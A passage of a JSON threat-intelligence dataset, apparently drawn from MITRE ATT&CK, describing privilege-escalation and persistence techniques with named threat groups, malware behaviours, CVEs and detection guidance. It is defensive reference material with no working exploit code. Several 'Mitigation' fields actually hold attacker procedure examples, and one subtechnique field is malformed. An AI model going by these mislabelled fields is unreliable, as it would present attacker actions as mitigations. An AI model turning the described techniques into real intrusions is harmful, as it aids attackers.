        "detects": "Monitor for executed processes that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.[33] Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Metadata",
        "detects": "Monitor for contextual data about an account, which may include a username, user ID, environmental data, etc. that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1134.001",
        "name": "Token Impersonation/Theft"
      },
      {
        "id": "T1134.002",
        "name": "Create Process with Token"
      },
      {
        "id": "T1134.003",
        "name": "Make and Impersonate Token"
      },
      {
        "id": "T1134.004",
        "name": "Parent PID Spoofing"
      },
      {
        "id": "T1134.005",
        "name": "SID-History Injection"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "Account Manipulation",
    "Code": "T1098",
    "Description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[1]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has been known to add created accounts to local admin groups to maintain elevated access.[2]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 has added user accounts to the User and Admin groups.[3]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto adds permissions and remote logins to all users.[4]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has added newly created accounts to the administrators group to maintain elevated access.[5]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has assigned newly created accounts the sysadmin role to maintain persistence.[6]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has granted privileges to domain accounts.[7]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has added accounts to specific groups with net localgroup.[8]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.[9][10]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.[11]"
      },
      {
        "id": "S0002",
        "name": "Mimikatz",
        "description": "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.[12][13]"
      },
      {
        "id": "S0382",
        "name": "ServHelper",
        "description": "ServHelper has added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups.[14]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has added user accounts to local Admin groups.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for the registration or joining of new device objects in Active Directory. Raise alerts when new devices are registered or joined without using MFA.[16]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for suspicious commands to modify accounts or account settings (including files such as the authorized_keys or /etc/ssh/sshd_config).Monitor executed commands and arguments of suspicious commands (such as Add-MailboxPermission) that may be indicative of modifying the permissions of Exchange and other related service settings."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files related to account settings, such as /etc/ssh/sshd_config and the authorized_keys file for each user on a system."
      },
      {
        "id": "DS0036",
        "dsource": "Group",
        "dcomp": "Group Modification",
        "detects": "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes indicative of modifying account settings, such as those that modify authorized_keys or /etc/ssh/sshd_config files."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670. Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ or that include additional flags such as changing a password without knowledge of the old password.Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1098.001",
        "name": "Additional Cloud Credentials"
      },
      {
        "id": "T1098.002",
        "name": "Additional Email Delegate Permissions"
      },
      {
        "id": "T1098.003",
        "name": "Additional Cloud Roles"
      },
      {
        "id": "T1098.004",
        "name": "SSH Authorized Keys"
      },
      {
        "id": "T1098.005",
        "name": "Device Registration"
      },
      {
        "id": "T1098.006",
        "name": "Additional Container Cluster Roles"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Boot or Logon Autostart Execution",
    "Code": "T1547",
    "Description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5] These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "Mitigation": [
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.[6]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack’s RAT makes a persistent target file with auto execution on the host start.[7]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has created registry keys for persistence, including HKCU\\Software\\bkfouerioyou, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}.[8]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat has created registry keys for persistence, including HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, HKCU\\Software\\Backtsaleht\\StubPath, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}.[8]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0008",
        "dsource": "Kernel",
        "dcomp": "Kernel Module Load",
        "detects": "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data to increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for additions of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1547.001",
        "name": "Registry Run Keys / Startup Folder"
      },
      {
        "id": "T1547.002",
        "name": "Authentication Package"
      },
      {
        "id": "T1547.003",
        "name": "Time Providers"
      },
      {
        "id": "T1547.004",
        "name": "Winlogon Helper DLL"
      },
      {
        "id": "T1547.005",
        "name": "Security Support Provider"
      },
      {
        "id": "T1547.006",
        "name": "Kernel Modules and Extensions"
      },
      {
        "id": "T1547.007",
        "name": "Re-opened Applications"
      },
      {
        "id": "T1547.008",
        "name": "LSASS Driver"
      },
      {
        "id": "T1547.009",
        "name": "Shortcut Modification"
      },
      {
        "id": "T1547.010",
        "name": "Port Monitors"
      },
      {
        "id": "T1547.012",
        "name": "Print Processors"
      },
      {
        "id": "T1547.013",
        "name": "XDG Autostart Entries"
      },
      {
        "id": "T1547.014",
        "name": "Active Setup"
      },
      {
        "id": "T1547.015",
        "name": "Login Items"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Boot or Logon Initialization Scripts",
    "Code": "T1037",
    "Description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "Mitigation": [
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.[1]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has installed an \"init.d\" startup script to maintain persistence.[2]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .conf file in the /etc/init/ folder.[3]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made in the Active Directory that may use scripts automatically executed at boot or logon initialization to establish persistence."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may consist of logon scripts for unusual access by abnormal users or at abnormal times."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may use scripts automatically executed at boot or logon initialization to establish persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that are modified by unusual accounts outside of normal administration duties."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may use scripts automatically executed at boot or logon initialization to establish persistence. Adversaries may schedule software to run whenever a user logs into the system; this is done to establish persistence and sometimes for lateral movement. This trigger is established through the registry key HKEY_CURRENT_USER\\EnvironmentUserInitMprLogonScript. This signature looks edits to existing keys or creation of new keys in that path. Users purposefully adding benign scripts to this path will result in false positives; that case is rare, however. There are other ways of running a script at startup or login that are not covered in this signature. Note that this signature overlaps with the Windows Sysinternals Autoruns tool, which would also show changes to this registry path.Analytic 1 - Boot or Logon Initialization Scripts logon_script_key_processes = filter processes where (  command_line = \"regadd\\EnvironmentUserInitMprLogonScript\")registry = search (Registry:Add OR Registry:Edit)registry_logon_key_events = filter registry where (  key = \"\\EnvironmentUserInitMprLogonScript\")"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for newly constructed windows registry keys that may use scripts automatically executed at boot or logon initialization to establish persistence."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1037.001",
        "name": "Logon Script (Windows)"
      },
      {
        "id": "T1037.002",
        "name": "Login Hook"
      },
      {
        "id": "T1037.003",
        "name": "Network Logon Script"
      },
      {
        "id": "T1037.004",
        "name": "RC Scripts"
      },
      {
        "id": "T1037.005",
        "name": "Startup Items"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Create or Modify System Process",
    "Code": "T1543",
    "Description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1] On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.[2] Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
    "Mitigation": [
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for new service driver installations and loads (ex: Sysmon Event ID 6) that are not part of known software update/patch cycles."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes to files associated with system-level processes."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "New, benign system processes may be created during installation of new software."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Service Modification",
        "detects": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for newly constructed windows registry keys that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to windows registry keys and/or values that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1543.001",
        "name": "Launch Agent"
      },
      {
        "id": "T1543.002",
        "name": "Systemd Service"
      },
      {
        "id": "T1543.003",
        "name": "Windows Service"
      },
      {
        "id": "T1543.004",
        "name": "Launch Daemon"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Domain Policy Modification",
    "Code": "T1484",
    "Description": "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment[1][2][3] or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.[4] Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller.Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later)[5]."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.[2][6][7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Creation",
        "detects": "Monitor for newly constructed active directory objects, such as Windows EID 5137."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Deletion",
        "detects": "Monitor for unexpected deletion of an active directory object, such as Windows EID 5141."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.)."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes Set federation settings on domain and Set domain authentication.[8][9]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1484.001",
        "name": "Group Policy Modification"
      },
      {
        "id": "T1484.002",
        "name": "Domain Trust Modification"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "Escape to Host",
    "Code": "T1611",
    "Description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.[1]There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as unshare and keyctl to escalate privileges and steal secrets.[2][3][4][5][6][7]Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as docker.sock, to break out of the container via a Container Administration Command.[5] Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.[8]Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",
    "Mitigation": [
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki’s container was configured to bind the host root directory.[4]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used the BOtB tool that can break out of containers. [9]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can gain a reverse shell on a host node by mounting the Kubernetes hostPath.[10]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of NtSetInformationSymbolicLink.[11]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has deployed privileged containers that mount the filesystem of victim machine.[12][13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root."
      },
      {
        "id": "DS0008",
        "dsource": "Kernel",
        "dcomp": "Kernel Module Load",
        "detects": "Monitor for the installation of kernel modules that could be abused to escape containers on a host."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for unexpected usage of syscalls such as mount that may indicate an attempt to escape from a privileged container to host."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for process activity (such as unexpected processes spawning outside a container and/or on a host) that might indicate an attempt to escape from a privileged container to host."
      },
      {
        "id": "DS0034",
        "dsource": "Volume",
        "dcomp": "Volume Modification",
        "detects": "Monitor cluster-level (Kubernetes) data and events associated with changing containers' volume configurations."
      }
    ],
    "Subtechniques": "\nPrivilege Escalation"
  },
  {
    "Title": "Event Triggered Execution",
    "Code": "T1546",
    "Description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Modification",
        "detects": "Monitor the creation and modification of cloud resources that may be abused for persistence, such as functions and workflows monitoring cloud events."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0005",
        "dsource": "WMI",
        "dcomp": "WMI Creation",
        "detects": "Monitor for newly constructed WMI Objects that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1546.001",
        "name": "Change Default File Association"
      },
      {
        "id": "T1546.002",
        "name": "Screensaver"
      },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      {
        "id": "T1546.004",
        "name": "Unix Shell Configuration Modification"
      },
      {
        "id": "T1546.005",
        "name": "Trap"
      },
      {
        "id": "T1546.006",
        "name": "LC_LOAD_DYLIB Addition"
      },
      {
        "id": "T1546.007",
        "name": "Netsh Helper DLL"
      },
      {
        "id": "T1546.008",
        "name": "Accessibility Features"
      },
      {
        "id": "T1546.009",
        "name": "AppCert DLLs"
      },
      {
        "id": "T1546.010",
        "name": "AppInit DLLs"
      },
      {
        "id": "T1546.011",
        "name": "Application Shimming"
      },
      {
        "id": "T1546.012",
        "name": "Image File Execution Options Injection"
      },
      {
        "id": "T1546.013",
        "name": "PowerShell Profile"
      },
      {
        "id": "T1546.014",
        "name": "Emond"
      },
      {
        "id": "T1546.015",
        "name": "Component Object Model Hijacking"
      },
      {
        "id": "T1546.016",
        "name": "Installer Packages"
      }
    ],
    "Tactic": "PrivilegeEscalation, Persistence"
  },
  {
    "Title": "Exploitation for Privilege Escalation",
    "Code": "T1068",
    "Description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).[1][2] Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.[3][4][5]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host.[6]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has used CVE-2016-7255 to escalate privileges.[7]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.[8]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has exploited CVE-2021-1732 for privilege escalation.[9][10]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 abused named pipe impersonation for privilege escalation.[11]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.[12][13]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group has used exploits to increase their levels of rights and privileges.[14]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can exploit vulnerabilities such as MS14-058.[15][16]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.[17]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can exploit vulnerabilities such as MS16-032 and MS16-135.[18]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[19]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has exploited the CVE-2016-0167 local vulnerability.[20][21]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used the BOtB tool which exploits CVE-2019-5736.[22]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
